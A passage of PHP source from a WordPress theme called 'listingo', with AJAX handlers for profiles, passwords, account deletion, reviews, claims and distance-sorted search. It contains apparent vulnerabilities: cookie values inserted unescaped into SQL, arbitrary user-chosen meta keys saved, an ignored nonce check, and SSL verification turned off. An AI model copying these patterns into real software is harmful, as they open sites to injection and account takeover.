    function listingo_set_profile_image() {
        global $current_user, $wp_roles, $userdata, $post;
        $user_identity = $current_user->ID;
        $json = array();

        $attach_id  = $_REQUEST['id'];
        $image_type = $_REQUEST['image_type'];

        if (!empty($image_type) && $image_type === 'profile_photo') {
            $profile_gallery = get_user_meta($user_identity, 'profile_avatar', true);
            $profile_gallery['default_image'] = $attach_id;

            $update_avatar = update_user_meta($user_identity, 'profile_avatar', $profile_gallery);
            $avatar = apply_filters('listingo_get_media_filter', listingo_get_user_avatar(array('width' => 100, 'height' => 100), $user_identity), array('width' => 100, 'height' => 100)
            );
			
            $json['avatar'] = $avatar;
			$json['type'] = 'success';
			$json['message'] = esc_html__('Default avatar updated.', 'listingo');
        } elseif (!empty($image_type) && $image_type === 'profile_banner') {
            $profile_banner = get_user_meta($user_identity, 'profile_banner_photos', true);
            $profile_banner['default_image'] = $attach_id;

            $update_banner = update_user_meta($user_identity, 'profile_banner_photos', $profile_banner);
            $avatar = apply_filters('listingo_get_media_filter', listingo_get_user_banner(array('width' => 270, 'height' => 120), $user_identity), array('width' => 270, 'height' => 120)
            );
			
            $json['avatar'] = $avatar;
			$json['type'] = 'success';
			$json['message'] = esc_html__('Default banner updated.', 'listingo');
        } else{
			 $json['type'] = 'error';
             $json['message'] = esc_html__('An error occurred, please try again later', 'listingo');
		}

        echo json_encode($json);
        exit;
    }

    add_action('wp_ajax_listingo_set_profile_image', 'listingo_set_profile_image');
    add_action('wp_ajax_nopriv_listingo_set_profile_image', 'listingo_set_profile_image');
}


/**
 * Update User Password
 *
 * @param json
 * @return string
 */
if (!function_exists('listingo_change_user_password')) {

    function listingo_change_user_password() {
        global $current_user;
        $user_identity = $current_user->ID;
        $json = array();
		
		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; //if demo site then prevent
		
        $do_check = check_ajax_referer('sp_change_account_password', 'change-account-password', false);
        if ($do_check == false) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('No kiddies please!', 'listingo');
            echo json_encode($json);
            die;
        }

        $user = wp_get_current_user(); //trace($user);
        $is_password = wp_check_password($_POST['old_passowrd'], $user->user_pass, $user->data->ID);

        if ($is_password) {

            if (empty($_POST['new_passowrd']) || empty($_POST['confirm_password'])) {
                $json['type'] = 'error';
                $json['message'] = esc_html__('Please add your new password.', 'listingo');
                echo json_encode($json);
                exit;
            }

            if ($_POST['new_passowrd'] == $_POST['confirm_password']) {
                wp_update_user(array('ID' => $user_identity, 'user_pass' => esc_attr($_POST['new_passowrd'])));
                $json['type'] = 'success';
                $json['message'] = esc_html__('Password Updated.', 'listingo');
            } else {
                $json['type'] = 'error';
                $json['message'] = esc_html__('The passwords you entered do not match. Your password was not updated', 'listingo');
            }
        } else {
            $json['type'] = 'error';
            $json['message'] = esc_html__('Old Password doesn\'t matched with the existing password', 'listingo');
        }

        echo json_encode($json);
        exit;
    }

    add_action('wp_ajax_listingo_change_user_password', 'listingo_change_user_password');
    add_action('wp_ajax_nopriv_listingo_change_user_password', 'listingo_change_user_password');
}

/**
 * Update User Account Status
 * Activate And Deactivate The Account Status.
 * @param json
 * @return string
 */
if (!function_exists('listingo_process_account_status')) {

    function listingo_process_account_status() {
        global $current_user;
        $user_identity = $current_user->ID;
        $json = array();
        $action = $_POST['process'];
        $user = wp_get_current_user(); //trace($user);
		
		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; //if demo site then prevent
		

        $do_check = check_ajax_referer('sp_account_change_status_nonce', 'account-change-status-process', false);
        if ($do_check == false) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('No kiddies please!', 'listingo');
            echo json_encode($json);
            die;
        }

        //Account Activation
        if (isset($action) && $action === 'activateme') {
            update_user_meta($user->data->ID, 'activation_status', 'active');
            $json['type'] = 'success';
            $json['message'] = esc_html__('Account Activated.', 'listingo');
            echo json_encode($json);
            die;
        }

        //Account de-activation			
        if (empty($_POST['message'])) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('Please add some description.', 'listingo');
            echo json_encode($json);
            exit;
        }

        if (empty($_POST['currentpassword']) || empty($_POST['retypepassword'])) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('Please add your password and confirm password.', 'listingo');
            echo json_encode($json);
            exit;
        }

        $is_password = wp_check_password($_POST['currentpassword'], $user->user_pass, $user->data->ID);

        if ($is_password) {
            if ($_POST['currentpassword'] == $_POST['retypepassword']) {
                if (isset($action) && $action === 'deleteme') {
                    wp_delete_user($user->data->ID, 1);
					$message	= esc_attr( $_POST['message'] );
					
					if( class_exists( 'ListingoProcessEmail' ) ) {
						$email_helper	= new ListingoProcessEmail();
						$emailData	= array();
						$emailData['user_identity']	=  $user->data->ID;
						$emailData['reason']		=  esc_attr( $message );
						$emailData['email']	   		=  $user->data->user_email;;
						$email_helper->delete_user_account($emailData);
					}
					
                    $json['type'] = 'success';
                    $json['message'] = esc_html__('You account has been deleted.', 'listingo');
                } elseif (isset($action) && $action === 'deactivateme') {
                    update_user_meta($user->data->ID, 'activation_status', 'deactive');
                    update_user_meta($user->data->ID, 'deactivate_leave_reason', sanitize_text_field($_POST['leave_reason']));
                    update_user_meta($user->data->ID, 'deactivate_reason', sanitize_text_field($_POST['message']));

                    $json['type'] = 'success';
                    $json['message'] = esc_html__('You account has been deactivated.', 'listingo');
                }
            } else {
                $json['type'] = 'error';
                $json['message'] = esc_html__('The password you have entered does not match.', 'listingo');
            }
        } else {
            $json['type'] = 'error';
            $json['message'] = esc_html__('Password does not match.', 'listingo');
        }

        echo json_encode($json);
        exit;
    }

    add_action('wp_ajax_listingo_process_account_status', 'listingo_process_account_status');
    add_action('wp_ajax_nopriv_listingo_process_account_status', 'listingo_process_account_status');
}

/**
 * @Profile Dashboard Settings
 * @return {}
 */
if (!function_exists('listingo_process_profile_settings')) {

    function listingo_process_profile_settings() {
        global $current_user;
        $user_identity = $current_user->ID;
		$json	=  array();
		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; //if demo site then prevent
		
        $do_check = check_ajax_referer('sp_profile_settings_nonce', 'profile-settings-update', false);
        if ($do_check == false) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('No kiddies please!', 'listingo');
            wp_send_json($json);
        }
		
		$required_fields	= array(
								'phone' => esc_html__('Phone number is required.', 'listingo'),
								'first_name' => esc_html__('First Name is required.', 'listingo'),
								'last_name' => esc_html__('Last name is required.', 'listingo'),
								'company_name' => esc_html__('Company Name is required.', 'listingo'),
							  );
		
		$required_fields	= apply_filters('listingo_basics_optional_fields',$required_fields);
		
		foreach ($required_fields as $key => $value) {
			if( isset($_POST['basics'][$key]) && empty( $_POST['basics'][$key] ) ){
				$json['type'] = 'error';
				$json['message'] = $required_fields[$key];
				wp_send_json($json);
			}
		}
		
        /**
         * Save Profile Dashboard Languages
         */
        if (isset($_POST['languages'])) {
            update_user_meta($user_identity, 'profile_languages', ($_POST['languages']));
        }
		
		/**
         * Save Profile Dashboard categories
         */
        if (isset($_POST['sub_categories'])) {
            update_user_meta($user_identity, 'sub_category', ($_POST['sub_categories']));
			$provider_category	= listingo_get_provider_category($user_identity);
			do_action('listingo_update_category_search',$provider_category,'category',$user_identity);
			do_action('listingo_update_category_search',$_POST['sub_categories'],'sub_category',$user_identity);
        }

        /**
         * Save Profile Dashboard Amenities
         */
        if (isset($_POST['amenities'])) {
            update_user_meta($user_identity, 'profile_amenities', ($_POST['amenities']));
        }

        /**
         * Save Profile Dashboard insurance
         */
        if (isset($_POST['insurance'])) {
            update_user_meta($user_identity, 'profile_insurance', ($_POST['insurance']));
        }

        /**
         * Save Introduction Statement
         */
        if (isset($_POST['professional_statements'])) {
            update_user_meta($user_identity, 'professional_statements', wp_kses_post($_POST['professional_statements']));
        }


        /**
         * Save Introduction Statement
         */
        if (isset($_POST['social_api'])) {
            update_user_meta($user_identity, 'sp_social_api', $_POST['social_api']);
        }

        /**
         * Save Social Links
         */
        if (!empty($_POST['socials'])) {
            foreach ($_POST['socials'] as $key => $value) {
                update_user_meta($user_identity, $key, esc_attr($value));
            }
        }

        /**
         * Save Basic Information
         */
        $first_name = '';
        $last_name = '';
        if (!empty($_POST['basics'])) {
            foreach ($_POST['basics'] as $key => $value) {
                update_user_meta($user_identity, $key, esc_attr($value));
            }
        }
		
		

        /**
         * Update User Name
         */
        $username = listingo_get_username($user_identity);
        update_user_meta($user_identity, 'username', sanitize_text_field($username));
        update_user_meta($user_identity, 'full_name', sanitize_text_field($username));
        wp_update_user(array('ID' => $user_identity, 'user_url' => esc_url($_POST['basics']['user_url'])));
		
		
		$posted_videos	= !empty( $_POST['videos'] ) ? $_POST['videos'] : array();
		$allowed_videos	= apply_filters( 'listingo_get_allowed_number', 'subscription_videos','sp_videos' );
		$posted_videos	= array_slice($posted_videos, 0, $allowed_videos);

        /**
         * Save Audio/Video Links
         */
        update_user_meta($user_identity, 'audio_video_urls', ($posted_videos));

        /**
         * Save Certification and Awards.
         */
        $awards = array();
        if (!empty($_POST['awards'])) {

            $counter = 0;
            foreach ($_POST['awards'] as $key => $value) {
                if (!empty($value['title'])) {
                    $awards[$counter]['attachment_id'] = intval($value['attachment_id']);
                    $awards[$counter]['thumbnail_url'] = esc_url($value['thumbnail_url']);
                    $awards[$counter]['banner_url'] = esc_url($value['banner_url']);
                    $awards[$counter]['full_url'] = esc_url($value['full_url']);
                    $awards[$counter]['title'] = esc_attr($value['title']);
                    $awards[$counter]['date'] = !empty($value['date']) ? strtotime($value['date']) : '';
                    $awards[$counter]['description'] = esc_attr($value['description']);
                    $counter++;
                }
            }
            $json['awards'] = $awards;
        }
		
        update_user_meta($user_identity, 'awards', $awards);

        /**
         * Save Experiences
         */
        $experience = array();
        if (!empty($_POST['experience'])) {

            $counter = 0;
            foreach ($_POST['experience'] as $key => $value) {
                if (!empty($value['title'])) {
                    $experience[$counter]['current'] = esc_attr($value['current']);
                    $experience[$counter]['title'] = esc_attr($value['title']);
                    $experience[$counter]['company'] = esc_attr($value['company']);
                    $experience[$counter]['start_date'] = !empty($value['start_date']) ? strtotime($value['start_date']) : '';
                    $experience[$counter]['end_date'] = !empty($value['end_date']) ? strtotime($value['end_date']) : '';
                    $experience[$counter]['description'] = esc_attr($value['description']);
                    $counter++;
                }
            }
            $json['experience'] = $experience;
        }
        update_user_meta($user_identity, 'experience', $experience);

        /**
         * Save Qualification
         */
        $qualification = array();
        if (!empty($_POST['qualification'])) {

            $counter = 0;
            foreach ($_POST['qualification'] as $key => $value) {
                if (!empty($value['title'])) {
                    $qualification[$counter]['title'] = esc_attr($value['title']);
                    $qualification[$counter]['institute'] = esc_attr($value['institute']);
                    $qualification[$counter]['start_date'] = !empty($value['start_date']) ? strtotime($value['start_date']) : '';
                    $qualification[$counter]['end_date'] = !empty($value['end_date']) ? strtotime($value['end_date']) : '';
                    $qualification[$counter]['description'] = esc_attr($value['description']);
                    $counter++;
                }
            }
            $json['qualification'] = $qualification;
        }
        update_user_meta($user_identity, 'qualification', $qualification);
		
		do_action('listingo_do_update_profile_settings',$_POST); //Developers Hook: action to update newly added data
		$messagedata	= apply_filters('listingo_return_profile_settings',$_POST);
		
		$json['messagedata'] = $messagedata;
		
        $json['type'] = 'success';
        $json['message'] = esc_html__('Settings saved.', 'listingo');
        echo json_encode($json);
        die;
    }

    add_action('wp_ajax_listingo_process_profile_settings', 'listingo_process_profile_settings');
    add_action('wp_ajax_nopriv_listingo_process_profile_settings', 'listingo_process_profile_settings');
}

/**
 * @Submit Claim
 * @return 
 */
if (!function_exists('listingo_submit_claim')) {

    function listingo_submit_claim() {
        global $current_user;
        $json = array();

        $do_check = check_ajax_referer('sp_claim', 'security', false);
        if ($do_check == false) {
            //Do something
        }
		
        $user_to = !empty($_POST['user_to']) ? $_POST['user_to'] : '';
        $user_from  = $current_user->ID;
        $subject 	= sanitize_text_field($_POST['subject']);
        $report  	= sanitize_text_field($_POST['report']);

        if (empty($subject) ||
                empty($report) ||
                empty($user_to) ||
                empty($user_from)
        ) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('Please fill all the fields.', 'listingo');
            echo json_encode($json);
            die;
        }

        $claim_post = array(
            'post_title' => $subject,
            'post_status' => 'publish',
            'post_content' => $report,
            'post_author' => $user_from,
            'post_type' => 'sp_claims',
            'post_date' => current_time('Y-m-d H:i:s')
        );

        $post_id = wp_insert_post($claim_post);

        $claim_meta = array(
            'user_from' => $user_from,
            'user_to' => $user_to,
            'report' => $report,
        );

        //Update post meta
        foreach ($claim_meta as $key => $value) {
            update_post_meta($post_id, $key, $value);
        }

        $new_values = $claim_meta;

        if (isset($post_id) && !empty($post_id)) {
            fw_set_db_post_option($post_id, null, $new_values);
        }

        if (class_exists('ListingoProcessEmail')) {
            $email_helper = new ListingoProcessEmail();
            $emailData = array();
            $emailData['claimed_user_name'] = listingo_get_username($user_to);
            $emailData['claimed_by_name'] = listingo_get_username($user_from);
            $emailData['claimed_user_link'] = get_author_posts_url($user_to);
            $emailData['claimed_by_link'] = get_author_posts_url($user_from);
            $emailData['message'] = $report;
            $email_helper->process_claim_admin_email($emailData);
        }

        $json['type'] = 'success';
        $json['message'] = esc_html__('Your report received successfully.', 'listingo');
        echo json_encode($json);
        die;
    }

    add_action('wp_ajax_listingo_submit_claim', 'listingo_submit_claim');
    add_action('wp_ajax_nopriv_listingo_submit_claim', 'listingo_submit_claim');
}


/**
 * @Make Review
 * @return 
 */
if (!function_exists('listingo_make_review')) {

    function listingo_make_review() {
        global $current_user, $wp_roles, $userdata, $post;
		$json	= array();
		$review_meta	= array();
		
		if( function_exists('listingo_is_demo_site') ) { 
			listingo_is_demo_site() ;
		}; 
		
		do_action('listingo_is_action_allow'); //is action allow
		
        $user_to = !empty($_POST['user_to']) ? intval($_POST['user_to']) : '';

        $do_check = check_ajax_referer('sp_review_data_nonce', 'review-data-submit', false);
        if ($do_check == false) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('No kiddies please!', 'listingo');
            echo json_encode($json);
            die;
        }

        if (!is_user_logged_in()) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('Please login first to add review.', 'listingo');
            echo json_encode($json);
            die;
        }

        $cat_review_status = 'pending';

        if (function_exists('fw_get_db_settings_option')) {
            $cat_review_status = fw_get_db_settings_option('dir_review_status', $default_value = null);
        }

        $user_reviews = array(
            'posts_per_page' 	=> "-1",
            'post_type' 		=> 'sp_reviews',
            'post_status' 		=> 'any',
            'author' 			=> $current_user->ID,
            'meta_key' 			=> 'user_to',
            'meta_value' 		=> $user_to,
            'meta_compare' 		=> "=",
            'orderby' 			=> 'meta_value',
            'order' 			=> 'ASC',
        );

        $reviews_query = new WP_Query($user_reviews);
        $reviews_count = $reviews_query->post_count;
        
		if (isset($reviews_count) && $reviews_count > 0) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('You have already submit a review.', 'listingo');
            echo json_encode($json);
            die();
        }

        $db_category_type = get_user_meta($user_to, 'category', true);

        /* Get the rating headings */
        $rating_titles = listingo_get_reviews_evaluation($db_category_type, 'leave_rating');

        //Office Evaluation		
        if ( isset( $_POST['review_wait_time'] ) && esc_attr( $_POST['review_wait_time'] ) == '') {
            $json['type'] = 'error';
            $json['message'] = esc_html__('Total wait time required.', 'listingo');
            echo json_encode($json);
            die();
        }

        //Provider Evaluation		
        if (!empty($rating_titles)) {
            foreach ($rating_titles as $slug => $label) {
                if (empty($_POST[$slug])) {
                    $json['type'] = 'error';
                    $json['message'] = esc_html__('Rating is required.', 'listingo');
                    echo json_encode($json);
                    die();
                }
            }
        }


        if (!empty($_POST['reviewtitle']) 
			|| !empty($_POST['review_desc']) 
			|| !empty($_POST['user_to'])
        ) {

            $review_heading 		= sanitize_text_field($_POST['reviewtitle']);
            $review_description 	= sanitize_text_field($_POST['review_desc']);
            $recommended 			= sanitize_text_field($_POST['recommended']);
            $review_wait_time 		= !empty( $_POST['review_wait_time'] ) ? sanitize_text_field($_POST['review_wait_time']) :'';
            $user_from 				= intval($current_user->ID);
            $user_to 				= intval($_POST['user_to']);
            $category_type 			= intval($db_category_type);

            $review_post = array(
                'post_title' 		=> $review_heading,
                'post_status' 		=> $cat_review_status,
                'post_content' 		=> $review_description,
                'post_author' 		=> $user_from,
                'post_type' 		=> 'sp_reviews',
                'post_date' 		=> current_time('Y-m-d H:i:s')
            );

            $post_id = wp_insert_post($review_post);

            //Rating
            $rating = 0;

            /* Get the rating headings */
            $rating_evaluation = listingo_get_reviews_evaluation($db_category_type, 'leave_rating');
            $rating_evaluation_count = !empty($rating_evaluation) ? listingo_count_items($rating_evaluation) : 0;

            $review_extra_meta = array();

            //Office Evaluation		
            if (!empty($rating_evaluation)) {
                foreach ($rating_evaluation as $slug => $label) {
                    if (isset($_POST[$slug])) {
                        $review_extra_meta[$slug] = esc_attr($_POST[$slug]);
                        update_post_meta($post_id, $slug, esc_attr($_POST[$slug]));
                        $rating += (int) $_POST[$slug];
                    }
                }
            }

            $user_rating = $rating / $rating_evaluation_count;

            $user_rating = number_format((float) $user_rating, 2, '.', '');

            $review_meta = array(
                'user_rating' 		=> $user_rating,
                'user_from' 		=> $user_from,
                'user_to' 			=> $user_to,
                'recommended' 		=> $recommended,
                'category_type' 	=> $category_type,
                'review_wait_time' 	=> $review_wait_time,
                'review_date' 		=> current_time('Y-m-d H:i:s'),
            );

            $review_meta = array_merge($review_meta, $review_extra_meta);

            //Update post meta
            foreach ($review_meta as $key => $value) {
                update_post_meta($post_id, $key, $value);
            }

            $review_meta['user_from'] 	= array($user_from);
            $review_meta['user_to'] 	= array($user_to);

            $new_values = $review_meta;
            if (isset($post_id) && !empty($post_id)) {
                fw_set_db_post_option($post_id, null, $new_values);
            }

            /* Update recommendation in user table */
            $total_recommendations = 0;
            $user_review_meta = array();
            if (isset($cat_review_status) && $cat_review_status == 'publish') {
                if (isset($recommended) && $recommended === 'yes') {
                    $total_recommendations = listingo_get_review_data($user_to, 'sp_total_recommendation', 'value');
                    $total_recommendations++;
                } else {
                    $total_recommendations = listingo_get_review_data($user_to, 'sp_total_recommendation', 'value');
                }
            }
			
            //$user_review_meta['sp_total_recommendation'] = $total_recommendations;
            //update_user_meta($user_to, 'review_data', $user_review_meta);

            /* Update avarage rating in user table */
            $average_rating = listingo_get_everage_rating($user_to);

            foreach ($average_rating as $key => $rating) {
                $user_review_meta[$key] = $rating;
            }
			
			$total_rating	= !empty( $user_review_meta['sp_average_rating'] ) ? $user_review_meta['sp_average_rating'] : 0;
            update_user_meta($user_to, 'review_data', $user_review_meta);
			update_user_meta($user_to, 'rating_filter', $total_rating);
			
            $json['type'] = 'success';
            if (isset($cat_review_status) && $cat_review_status == 'publish') {
                $json['message'] = esc_html__('Your review published successfully.', 'listingo');
                $json['html'] = 'refresh';
            } else {
                $json['message'] = esc_html__('Your review submitted successfully, it will be publised after approval.', 'listingo');
                $json['html'] = '';
            }

            /* Mail Code Here */
            if (class_exists('ListingoProcessEmail')) {
                $user_from_data = get_userdata($user_from);
                $user_to_data 	= get_userdata($user_to);
                $email_helper 	= new ListingoProcessEmail();

                $emailData = array();

                //User to data
                $emailData['email_to'] 		= $user_to_data->user_email;
                $emailData['link_to'] 		= get_author_posts_url($user_to_data->ID);
                $emailData['username_to'] 	= listingo_get_username($user_to);
                $emailData['username_from'] = listingo_get_username($user_from);
                $emailData['link_from'] 	= get_author_posts_url($user_from_data->ID);
                
				//General
                $emailData['rating'] = $user_rating;
                $emailData['reason'] = $review_heading;

                $email_helper->process_rating_email($emailData);
            }

            echo json_encode($json);
            die;
			
        } else {
            $json['type'] = 'error';
            $json['message'] = esc_html__('Please fill all the fields.', 'listingo');
            echo json_encode($json);
            die;
        }
    }

    add_action('wp_ajax_listingo_make_review', 'listingo_make_review');
    add_action('wp_ajax_nopriv_listingo_make_review', 'listingo_make_review');
}

/**
 * @Update Review
 * @return 
 */
if (!function_exists('listingo_update_user_review_on_review_delete')) {
	//add_action( 'wp_trash_post', 'listingo_update_user_review_on_review_delete' );
	function listingo_update_user_review_on_review_delete( $postid ){
		global $post_type;

		if ( $post_type === 'sp_reviews' ){
			$data = array();
			$user_to 	= get_post_meta($postid, 'user_to', true);
			$average_rating = listingo_get_everage_rating($user_to);

			foreach ($average_rating as $key => $rating) {
				$user_review_meta[$key] = $rating;
			}

			$total_rating	= !empty( $user_review_meta['sp_average_rating'] ) ? $user_review_meta['sp_average_rating'] : 0;
			update_user_meta($user_to, 'review_data', $user_review_meta);
			update_user_meta($user_to, 'rating_filter', $total_rating);
		}
	}
}

/**
 * @Update Review
 * @return 
 */
if (!function_exists('listingo_update_user_review')) {

    function listingo_update_user_review($user_id) {
		$user_reviews = array(
            'posts_per_page' 	=> "-1",
            'post_type' 		=> 'sp_reviews',
            'post_status' 		=> 'any',
            'meta_key' 			=> 'user_to',
            'meta_value' 		=> $user_id,
            'meta_compare' 		=> "=",
            'orderby' 			=> 'ID',
            'order' 			=> 'ASC',
        );

        $cust_query = get_posts($user_reviews);

        if (!empty($cust_query)) {
            $counter = 0;
            foreach ( $cust_query as $key => $dir ) {
				
			}
        }
		
		
	}
}

/**
 * @Save Appointment Settings
 * @return {}
 */
if (!function_exists('listingo_save_appointment_settings')) {

    function listingo_save_appointment_settings() {
		
        global $current_user;
        $user_identity = $current_user->ID;
        $json = array();

        $do_check = check_ajax_referer('sp_appointment_settings_nonce', 'appointment-settings-update', false);
        if ($do_check == false) {
            $json['type'] = 'error';
            $json['message'] = esc_html__('No kiddies please!', 'listingo');
            echo json_encode($json);
            die;
        }

        //Get Appointment Type meta
        $appointment_type_db = get_user_meta($user_identity, 'appointment_types', true);
        $appointment_type_db = !empty($appointment_type_db) ? $appointment_type_db : array();
        $appointment_types_array = array();
        if (!empty($_POST['appointment_types'])) {
            $appointment_data = $_POST['appointment_types'];
            foreach ($appointment_data as $key => $value) {
                $type_key = sanitize_title($value);
                if (array_key_exists($key, $appointment_type_db)) {
                    $type_key = $key;
                }
                $appointment_types_array[$type_key] = esc_attr($value);
            }
        }

		
        update_user_meta($user_identity, 'appointment_types', $appointment_types_array);

        //Get Appointment reaosns meta
        $appointment_reasons_db = get_user_meta($user_identity, 'appointment_reasons', true);
        $appointment_reasons_db = !empty($appointment_reasons_db) ? $appointment_reasons_db : array();
        $appointment_reasons_array = array();
        if (!empty($_POST['appointment_reasons'])) {
            $appointment_reason_data = $_POST['appointment_reasons'];
            foreach ($appointment_reason_data as $key => $value) {
                $reasosn_key = sanitize_title($value);

                if (array_key_exists($key, $appointment_reasons_db)) {
                    $reasosn_key = $key;
                }
                $appointment_reasons_array[$reasosn_key] = esc_attr($value);
            }
        }
		
        update_user_meta($user_identity, 'appointment_reasons', $appointment_reasons_array);
        update_user_meta($user_identity, 'appointment_inst_title', esc_attr($_POST['appointment_inst_title']));
        update_user_meta($user_identity, 'appointment_inst_desc', wp_kses_post($_POST['instruction_description']));

        //Save email settings
        update_user_meta($user_identity, 'appt_confirmation_title', esc_attr($_POST['confirmation_title']));
        update_user_meta($user_identity, 'appt_approved_title', esc_attr($_POST['approved_title']));
        update_user_meta($user_identity, 'appt_cancelled_title', esc_attr($_POST['cancelled_title']));
        update_user_meta($user_identity, 'appt_booking_cancelled', wp_kses_post($_POST['booking_cancelled']));
        update_user_meta($user_identity, 'appt_booking_confirmed', wp_kses_post($_POST['booking_confirmed']));
        update_user_meta($user_identity, 'appt_booking_approved', wp_kses_post($_POST['booking_approved']));

        $json['type'] = 'success';
        $json['message'] = esc_html__('Appointment Settings Updated.', 'listingo');
        echo json_encode($json);
        die;
    }

    add_action('wp_ajax_listingo_save_appointment_settings', 'listingo_save_appointment_settings');
    add_action('wp_ajax_nopriv_listingo_save_appointment_settings', 'listingo_save_appointment_settings');
}



/**
 * Order_Status
 *
 * @param json
 * @return string
 */
if (!function_exists('listingo_prepare_order_status')) {

    function listingo_prepare_order_status($type = "array", $index = 'cancelled') {
        $status = array(
            'approved' => esc_html__('Complete', 'listingo'),
            'pending' => esc_html__('Pending', 'listingo'),
            'cancelled' => esc_html__('Rejected', 'listingo'),
        );

        if ($type === 'array') {
            return $status;
        } else {
            if (isset($status[$index])) {
                return $status[$index];
            } else {
                return '';
            }
        }
    }

}

/**
 * @get distance between two points
 * @return array
 */
if (!function_exists('listingo_GetDistanceBetweenPoints')) {
	function listingo_GetDistanceBetweenPoints($latitude1, $longitude1, $latitude2, $longitude2, $unit = 'Km') {
		$unit	= listingo_get_distance_scale();
		
		$theta = $longitude1 - $longitude2;
		$distance = (sin(deg2rad($latitude1)) * sin(deg2rad($latitude2))) + (cos(deg2rad($latitude1)) * cos(deg2rad($latitude2)) * cos(deg2rad($theta)));
		$distance = acos($distance);
		$distance = rad2deg($distance);
		$distance = $distance * 60 * 1.1515; switch($unit) {
		  case 'Mi': break;
		  case 'Km' : $distance = $distance * 1.60934;
		}
		return (round($distance,2)).'&nbsp;'. strtolower( $unit );
	}
}

/**
 * @get distance between two points
 * @return array
 */
if (!function_exists('listingo_get_distance_scale')) {
	function listingo_get_distance_scale() {
		if (function_exists('fw_get_db_settings_option')) {
			$dir_distance_type = fw_get_db_settings_option('dir_distance_type');
		} else {
			$dir_distance_type = 'Km';
		}
		
		$unit = !empty( $dir_distance_type ) && $dir_distance_type === 'mi' ? 'Mi' : 'Km';
		
		return $unit;
	}
}

/**
 * @Sort by distance
 * @return array
 */
if (!function_exists('listingo_search_by_distance_filter')) {
	add_action( 'pre_user_query', 'listingo_search_by_distance_filter' );
	function listingo_search_by_distance_filter( $sp_user_query ) {
		global $wpdb;
		$google_key = '';
		if( function_exists('fw_get_db_settings_option') ){
			$google_key = fw_get_db_settings_option('google_key');
		}
		
		if ( is_page_template('directory/search.php') 
			|| is_singular('sp_categories') 
			|| is_tax('sub_category') 
			|| is_tax('countries') 
			|| is_tax('cities') 
			|| is_tax('insurance') 
			|| is_tax('languages') 
			|| is_tax('amenities') 
		) {
			if( !empty( $_GET['geo'] )
				&&
				isset( $_GET['sortby'] )
				&& 
				$_GET['sortby'] == 'distance'
			) {
				
				$Latitude	= !empty( $_GET['lat'] ) ? esc_attr( $_GET['lat'] ) : '';
				$Longitude	= !empty( $_GET['long'] ) ?  esc_attr( $_GET['long'] ) : '';
				
				if( !empty( $Latitude ) && !empty( $Longitude ) ){
					$Latitude	 = $Latitude;
					$Longitude   = $Longitude;

				} else{
					$address	 = !empty($_GET['geo']) ?  $_GET['geo'] : '';
					$prepAddr	= str_replace(' ','+',$address);

					$args = array(
						'timeout'     => 15,
						'headers' => array('Accept-Encoding' => ''),
						'sslverify' => false
					);

					$url	    = 'https://maps.google.com/maps/api/geocode/json?address='.$prepAddr.'&key='.$google_key;;
					$response   = wp_remote_get( $url, $args );
					$geocode	= wp_remote_retrieve_body($response);

					$output	  = json_decode($geocode);

					if( isset( $output->results ) && !empty( $output->results ) ) {
						$Latitude	 = $output->results[0]->geometry->location->lat;
						$Longitude   = $output->results[0]->geometry->location->lng;
					}
				}

			   if( !empty( $Latitude ) && !empty( $Longitude ) ){
				   $sp_user_query->query_fields .= ", geo_search1.meta_value as lat, geo_search2.meta_value as lon, 
												( 3959 * acos( cos( radians( $Latitude ) ) 
												* cos( radians( geo_search1.meta_value ) ) 
												* cos( radians( geo_search2.meta_value ) 
												- radians( $Longitude ) ) 
												+ sin( radians( $Latitude ) ) 
												* sin( radians( geo_search1.meta_value ) ) ) ) * 1.60934 AS distance";  // additional fields 
												
				   $sp_user_query->query_from .= " INNER JOIN ".$wpdb->prefix."usermeta AS geo_search1 ON ( ".$wpdb->prefix."users.ID = geo_search1.user_id ) AND geo_search1.meta_key = 'latitude' "; // additional joins here
				   $sp_user_query->query_from .= " INNER JOIN ".$wpdb->prefix."usermeta AS geo_search2 ON ( ".$wpdb->prefix."users.ID = geo_search2.user_id ) AND geo_search2.meta_key = 'longitude' "; // additional joins here
				  
				   $sp_user_query->query_orderby  = ' ORDER BY distance ASC '; // additional sorting
			   }
			} else if( !empty( $_COOKIE['geo_location'] )
				&&
				isset( $_GET['sortby'] )
				&& 
				$_GET['sortby'] == 'distance'
			){
				
				$geo_location	= explode('|',$_COOKIE['geo_location']);
				
				$Latitude	= !empty( $geo_location[0] ) ? $geo_location[0] : '';
				$Longitude	= !empty( $geo_location[1] ) ? $geo_location[1] : '';
				
				if( isset( $Latitude ) &&  $Latitude !=''
					&& 
				   isset( $Longitude ) &&  $Longitude !=''
				) {

				   $sp_user_query->query_fields .= ", geo_search1.meta_value as lat, geo_search2.meta_value as lon, 
												( 3959 * acos( cos( radians( $Latitude ) ) 
												* cos( radians( geo_search1.meta_value ) ) 
												* cos( radians( geo_search2.meta_value ) 
												- radians( $Longitude ) ) 
												+ sin( radians( $Latitude ) ) 
												* sin( radians( geo_search1.meta_value ) ) ) ) * 1.60934 AS distance";  // additional fields 
												
				   $sp_user_query->query_from .= " INNER JOIN ".$wpdb->prefix."usermeta AS geo_search1 ON ( ".$wpdb->prefix."users.ID = geo_search1.user_id ) AND geo_search1.meta_key = 'latitude' "; // additional joins here
				   $sp_user_query->query_from .= " INNER JOIN ".$wpdb->prefix."usermeta AS geo_search2 ON ( ".$wpdb->prefix."users.ID = geo_search2.user_id ) AND geo_search2.meta_key = 'longitude' "; // additional joins here
				   $sp_user_query->query_orderby  = ' ORDER BY distance ASC '; // additional sorting
			   }
			}

		}

		return $sp_user_query;
	}
}


/**
 * @get min/max lat/long
 * @return array
 */
if (!function_exists('listingo_get_min_max_lat_lon')) {
	function listingo_get_min_max_lat_lon(){
		$radius		= !empty( $_GET['geo_distance'] ) ? esc_attr( $_GET['geo_distance'] ) : 10;
		if (function_exists('fw_get_db_settings_option')) {
			$dir_distance_type = fw_get_db_settings_option('dir_distance_type');
		} else {
